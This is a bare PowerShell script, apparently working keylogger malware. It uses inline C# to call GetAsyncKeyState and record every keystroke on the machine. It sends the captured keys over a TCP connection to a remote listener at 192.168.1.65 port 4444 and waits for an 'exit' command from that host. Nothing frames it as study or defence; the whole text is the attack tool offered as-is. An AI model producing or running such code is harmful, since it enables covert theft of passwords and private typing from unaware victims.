Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$keyLog = ""
$outputFile = "$env:USERPROFILE\Desktop\keylog.txt"
$client = New-Object System.Net.Sockets.TCPClient('192.168.1.65', 4444)
$stream = $client.GetStream()

while ($true) {
    Start-Sleep -Milliseconds 100
    for ($i = 0; $i -le 255; $i++) {
        $state = [KeyLogger]::GetAsyncKeyState($i)
        if ($state -ne 0 -and ($state -band 1) -ne 0) {
            $key = [char]$i
            $keyLog += $key
        }
    }

    if ($keyLog.Length -gt 0) {
        $bytes = [System.Text.Encoding]::ASCII.GetBytes($keyLog)
        $stream.Write($bytes, 0, $bytes.Length)
        $keyLog = ""
    }

    if ($stream.DataAvailable) {
        $buffer = New-Object byte[] 1024
        $i = $stream.Read($buffer, 0, $buffer.Length)
        if ($i -gt 0) {
            $response = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $i)
            if ($response -eq "exit") {
                $client.Close()
                exit
            }
        }
    }
}
